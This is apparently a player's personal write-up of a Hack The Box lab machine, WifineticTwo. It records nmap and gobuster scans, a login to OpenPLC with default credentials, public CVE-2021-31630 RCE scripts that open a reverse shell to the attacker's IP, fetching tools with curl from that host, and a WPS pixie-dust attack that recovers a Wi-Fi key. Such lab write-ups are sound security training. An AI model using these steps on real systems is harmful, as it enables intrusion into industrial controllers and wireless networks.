Notes wifinetictwo.htb
Date:03/22/2024 
Difficulty- "medium"

started with 

sudo nmap -sV -A wifinetictwo.htb -oN nmap-output.txt 

Shows a few things already. While parsing through this i'm going to run a blanket all port scan to see if anything was missed. Looks to be just those two. 

Ports open - 
22, 8080.

22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy Werkzeug/1.0.1 Python/2.7.18

No idea what Werkzeug is lol. 

allow: HEAD, OPTIONS, GET - probably a login. I'll look in a minute

Yep, it's a sign in for a web server. 

http://wifinetictwo.htb:8080/login

OpenPLC Webserver

A couple things here. Going to do some enumerating on the website. Maybe some subdomains or other content to find. GoBuster we go! 

 gobuster dns -d wifinetictwo.htb -w namelist.txt -t 1000
 
 I always add the -t for more threads while doing HTB. Otherwise it's SUPER slow. 
 
 Part of the reason why I stopped using FFuF 
 
 Nothing on the DNS part. Sometimes I'll -v to make sure the requests are coming through properly.

So we know these exist. I'll also throw dirsearch at it too. sometimes that finds things I didn't before. 

Doing some research on OpenPLC - 

https://github.com/openplcproject

Looks like some sort of IDE tool to help develop PLC software/circuits. 

Googled "OpenPLC WebServer exploit" and "OpenPLC WebServer Vulnerability". 

Landed me here. 
https://github.com/hev0x/CVE-2021-31630-OpenPLC_RCE

I'll look to see if any code exists and what the CVE actually is. 

https://nvd.nist.gov/vuln/detail/CVE-2021-31630

Looks like something is vulnerable on the /hardware page - maybe?

I think this may be more useful later on down the road..

Found another thing that supposedly allows rce. 

Maybe ping to verify connectivity. sudo tcpdump -i tun0 icmp

********
Earlier I made mention of the vulnerability that I had found. I was reluctant to use it. I didn't try because I saw the credential piece. I hadn't found the creds yet. 

For some reason I thought better of originally looking for the "default credentials." I tried doing a password spray with burp intruder using a few password lists. What a PITA. ALWAYS CHECK DEFAULT CREDS. 

Any case - 
openplc
openplc

sign in for the application. 

Exploit looks pretty straight forward for arguments / parameters. Username, password, port to reverse proxy on and your IP. 

python3 exploit.py -u http://wifinetictwo.htb:8080 -l openplc -p openplc -i 10.10.14.5 -r 1234

So you can see where it's uploading the file by going to the programs area.. But it's giving me an error while compiling. 

python3 exploit.py -ip 10.10.14.5 -p 1234 -u openplc -pwd openplc

Optimizing ST program...
Couldn't open file "./st_files/681871.st"
Generating C files...
Error opening main file ./st_files/681871.st: No such file or directory
Error generating C files
Compilation finished with errors!


python3 exploit3.py -u http://wifinetictwo.htb:8080 -l openplc -p openplc -i 10.10.14.5 -r 1234

Found a version that's working.. Looks like some modification of the code I had above. I'll have to review further. Also, this guy clearly doesn't like israel lol 

https://github.com/Hunt3r0x/CVE-2021-31630-HTB

I don't like doing this sorta thing though. I feel that it kind of takes awway from the learning part of it. But I had the proper RCE exploit, just something wasn't working properly on it. I found one that clearly work but I'll have to see what the difference is. It looks like he did just rip pieces out of the original authors code. 

it loads shell as root.. 
why.

In this case, lets get etc/shadow. My gut tells me this *isn't* the target box. It's going to be used as a relay.

Especially since it's "medium" and this was far too easy to actually exploit. 


Spwans me to /opt/PLC/OpenPLC_v3/webserver

Gonna do a python3 -m http.server from / lol 

That's kinda weird.. the user.txt was sitting in root...that was far too easy imo. Hardest part there would have been fixing the code.

Used linpeas to see if there was anything good. 

Interfaces shows the wireless interface that is suggested in the name. 

Using the wireless interface you can run this command

iw dev wlan0 scan 

iw - wireless
dev - define interface
wlan0 interface
scan - scan for networks. Similar to looking in the gui. 


iw dev wlan0 scan

If you look at the WPS section you can see that WPS is configured. From my limited wireless pentesting, I know when I use wifite it gives you the option to do a pixie dust attack on WPS. This will probably be what we need? 

Looking to see if we can do this without airmon ng. 

Looks like the tool OneShot.py may be able to do the trick? 

https://github.com/fulvius31/OneShot

Remember earlier we couldn't use wget for some god forsaken reason. 

curl http://10.10.14.5:8000/oneshot.py > oneshot.py

BSSID - 02:00:00:00:01:00
-i wlan0

python3 oneshot.py -i wlan0 -b 02:00:00:00:01:00 -K

For some reason that's giving me a hard time. Maybe another version online somewhere will help. 

https://github.com/kimocoder/OneShot

Aye, we've got a wifi password :)

] WPS PIN: '12345670'
[+] WPA PSK: 'NoWWEDoKnowWhaTisReal123!'
[+] AP SSID: 'plcrouter'

SSId is plcrouter and password is NoWWEDoKnowWhaTisReal123!

sudo iwconfig wlan0 essid "plcrouter" key "s:NoWWEDoKnowWhaTisReal123!"

This didn't work. wpa_supplicant is another option. 

wpa_supplicant is basically the gui equivalent of the little wifi icon on your desktop taskbar for the CLI

wpa_passphrase plcrouter 'NoWWEDoKnowWhaTisReal123!' > config
wpa_supplicant -B -c config -i wlan0

Connected - without an IP. DHCP obv isn't running here. 

ifconfig wlan0 192.168.1.5 netmask 255.255.255.0


think I found an issue i was running into. I never upgraded my shell. I need to look into this. I frequently run into this. 

python3 -c 'import pty; pty.spawn("/bin/bash")'

I messed up - last night instead of finishing the box I let it roll past forgetting the weekly boxes change. Oh well. I'll finish it today. 

root@ap:~# cat root.txt
cat root.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX


Finished 03/23/2024 

I could have finished this last night. But by the time I got around to it I was falling asleep at around 12:30 so I decided I'd finish it today 

Things I learned / taking out of this one. 

 - I'm still not looking for default creds because for some reason in my head I'm thinking "oh it can't be that simple" but it is. 
 - Learned of wpa_supplicant. I've never bothered configuring wifi in the cli outside of using wifite and iwconfig. Finding a OneShot version that was all independent was pretty cool as well. I've configured reaver on my small thing of wireless pentests before. But honestly I don't have very much experience with it. 
 - I'm not too sure as to how / why this was configured as Medium. I thought this box was pretty easy. The worst part was trying to figure out why you load in as root lol.
